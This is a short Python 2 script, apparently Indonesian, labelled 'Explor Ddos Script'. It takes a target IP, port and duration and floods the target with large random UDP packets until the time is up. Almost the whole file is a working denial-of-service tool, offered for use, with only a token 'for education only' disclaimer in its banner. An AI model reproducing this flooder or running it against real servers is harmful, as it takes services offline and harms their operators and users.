import time
import socket
import random
import sys
def usage():
    print "           ______"
    print "          ||              ____          ___        ____"
    print "          ||      \\\  // ||   \ ||     //  \   || //"
    print "          ||=====  \\\//  ||   | ||    ||    |  ||//"
    print "          ||       //\\\  ||===  ||    ||    |  ||"
    print "          ||_____ //  \\\ ||     ||____ \\\___/  ||"
    print ""
    print "                      Explor Ddos Script"
    print "               jan lupa subs chanel @ShannModerz"
    print "    semua yang ada dalam sc ini hanya untuk edukasi tidak lebih."
    print "<<<<<{}>===================================================<{}>>>>>"
    print "      | penggunaan : ketik python2 explor.py [-i] [-p] [-d] |"
    print "      | [-i]       : ip server websitenya                   |"
    print "      | [-p]       : port website (contoh:80)               |"
    print "      | [-d]       : dosa yg dikirim (contoh:350)           |"
    print "<<<<<{}>===================================================<{}>>>>>"
    print ""
    print ""
def flood(victim, vport, duration):
    # Support trs guys
    # Okey janga lupa buat mempergunakan sc ini dengan bijak
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # presentasi satu byte ke server anonym
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91m<<<<===Exploring\033[1;32m%s \033[1;91mmengirimkan jumlah dosa\033[1;32m%s \033[1;91mkepada port===>>>> \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

